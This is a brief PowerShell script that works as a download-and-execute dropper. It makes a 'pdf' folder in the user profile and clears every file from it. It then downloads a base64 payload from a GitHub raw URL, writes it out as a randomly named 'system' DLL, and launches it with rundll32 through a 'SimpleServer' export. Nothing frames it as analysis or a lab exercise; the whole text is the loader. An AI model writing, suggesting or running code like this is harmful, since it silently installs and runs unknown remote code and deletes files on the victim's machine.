$call = "SimpleServer"
$path_new = $env:USERPROFILE+"\pdf\";
If (-not (Test-Path $path_new)){
	New-Item -Path $path_new -ItemType Directory | Out-Null;
}
$file = "system"+ (Get-Random -Maximum 999) + ".dll"
$location = $path_new + $file;
$uri = "https://raw.githubusercontent.com/iskww/test/main/sys.b64";
Set-Location $path_new
Remove-Item *.*
[System.IO.File]::WriteAllBytes($location,[Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString($uri)))
Start-Process rundll32.exe -ArgumentList "$file, $call" ;
